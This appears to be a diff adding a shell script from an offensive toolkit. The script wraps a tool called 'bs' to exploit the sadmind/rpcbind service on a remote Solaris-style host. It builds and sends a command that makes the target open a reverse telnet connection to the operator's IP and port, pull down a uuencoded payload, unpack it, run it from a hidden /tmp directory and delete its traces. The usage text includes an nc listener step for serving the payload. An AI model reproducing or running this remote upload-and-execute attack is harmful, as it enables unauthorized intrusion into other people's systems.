@@ -1,0 +1,111 @@
+#!/bin/sh
+#
+# Use bs to upload a program via reverse telnet and run it
+#
+echo "CommandLine: ${0} ${*}"
+echo ""
+
+# Some default values
+SCRIPT="/tmp/...."
+DIR="/tmp/..."
+
+# Show usage and exit
+usage() {
+    echo ""
+    echo "Before running this script, you first need to run the following:"
+    echo "      nc -l -p localPort < file2Xfer&Run.uu"
+    echo "where file2Xfer&Run.uu is a compressed, uuencoded file."
+    echo ""
+    echo "Old Usage: ${0} rem_ip rem_host loc_ip loc_user loc_passwd file [args...]"
+    echo ""
+    echo "New usage: ${0} [options] -- [options to <file2Xfer&Run>]"
+    echo "  -i <remoteIP>       (required)"
+    echo "  -h <remoteHost>     (required)"
+    echo "  -a (does not work)  Use alt rpcbind port"
+    echo "  -s <sndPort>       hardwired 111" 
+    echo "  -r <rcvPort>        hardwired 111"
+    echo "  -d <remoteDomain>"
+    echo "  -p <sadmindPort>    def= query rpcbind"
+    echo "  -l <localIP>        (required)"
+    echo "  -n <localPort>      (no default)"
+    echo "  -f <file2Xfer&Run>  (required)"
+    echo "  -D <remoteDir>      def= $DIR"
+    echo "  -S <remoteScript>   def= $SCRIPT"
+    echo "  -G "grinch args"    deprecated"
+    exit 1
+}
+
+# There must be at least one argument
+if [ ${#} -eq 0 ]; then
+    usage
+fi
+
+#
+# Process args
+
+    # New style options
+    while getopts i:h:as:r:d:p:l:n:f:D:S:G: op; do
+	case $op in
+	i)  REMOTE_IP="-i $OPTARG";;
+	h)  REMOTE_HOST="-h $OPTARG";;
+	a)  altRpcbind="-a";;
+	s)  sndPort="-s $OPTARG";;
+	r)  rcvPort="-r $OPTARG";;
+	d)  remDomain="-d $OPTARG";;
+	p)  sadmindPort="-p $OPTARG";;
+	l)  LOCAL_IP="$OPTARG";;
+	n)  LOCAL_PORT="$OPTARG";;
+	f)  RUN_FILE="$OPTARG";;
+	D)  DIR="$OPTARG";;
+	S)  SCRIPT="$OPTARG";;
+#	G)  GRINCHARGS="$OPTARG";;
+	esac
+    done
+    cmdFlag="-c"
+    extraOpts="$altRpcbind $remDomain $sadmindPort"
+    shift `expr $OPTIND - 1`
+
+    # Check for required args
+    [ -z "$REMOTE_IP" ] && echo "Error: missing remote IP" && usage
+    [ -z "$REMOTE_HOST" ] && echo "Error: missing remote host" && usage
+    [ -z "$LOCAL_IP" ] && echo "Error: missing local IP" && usage
+EXTRA="${*}"
+
+echo "running: bs ${REMOTE_IP} ${REMOTE_HOST} -s 111 -r 111  $extraOpts ... $cmdFlag commands"
+
+echo "--> my IP is $LOCAL_IP"
+echo "--> port to telnet to is $LOCAL_PORT"
+echo "--> xfering and running $RUN_FILE"
+echo "--> using tmp file $SCRIPT"
+echo "--> using tmp dir ${DIR}"
+echo "--> Here's command being sent:"
+CMD="echo \"
+PATH=/usr/openwin/bin:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/gnu/bin:/usr/ucb:/usr/X11R6/bin
+export PATH
+mkdir -p ${DIR}
+cd ${DIR}
+(echo 'open ${LOCAL_IP} ${LOCAL_PORT}';/bin/cat)| /bin/telnet | /bin/cat| /usr/bin/uudecode  > /dev/null 2>&1
+uncompress -f ${RUN_FILE}.Z
+chmod 0700 ${DIR}/${RUN_FILE}
+PATH=${DIR} ${RUN_FILE}
+rm ${SCRIPT}
+\" > ${SCRIPT} 
+/bin/sh ${SCRIPT}
+"
+echo "$CMD"
+
+
+PLATFORM=`uname`
+if [ "$PLATFORM" = "Linux" ]; then
+  MINUSN=-n
+else
+  MINUSN=""
+fi
+echo $MINUSN "Hit enter to proceed, ^C to not: "
+
+read junk
+
+#exit 0
+
+bs ${REMOTE_IP} ${REMOTE_HOST} -s 111 -r 111   \
+$cmdFlag "$CMD" $extraOpts 
